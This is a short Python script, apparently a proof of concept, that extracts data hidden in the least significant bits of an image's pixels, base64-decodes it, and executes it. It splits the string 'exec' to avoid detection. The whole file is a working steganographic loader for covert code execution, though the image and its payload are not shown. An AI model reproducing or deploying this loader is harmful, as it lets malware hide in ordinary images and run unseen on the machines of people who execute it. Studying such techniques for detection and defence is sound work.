from PIL import Image
import base64
import types

def b2t(bd):
    return ''.join(chr(int(bd[i:i+8], 2)) for i in range(0, len(bd), 8))

def decodeFunction(eip):
    ei = Image.open(eip)
    ei = ei.convert("RGB")
    width, height = ei.size
    bd = ""
    for y in range(height):
        for x in range(width):
            pixel = ei.getpixel((x, y))
            for channel in range(3):
                bd += format(pixel[channel] & 1, '01')
    end_index = bd.find("00000000")
    bd = bd[:end_index]
    ptd = b2t(bd)
    return ptd

if __name__ == "__main__":
    encoded_image_path = "poc_example.png"
    string2ex = base64.b64decode(decodeFunction(encoded_image_path) + "===")
    obfs1 = "ex" 
    obfs2 = "ec"
    compiled_code = compile(string2ex, '<string>', obfs1 + obfs2)
    eval(compiled_code)
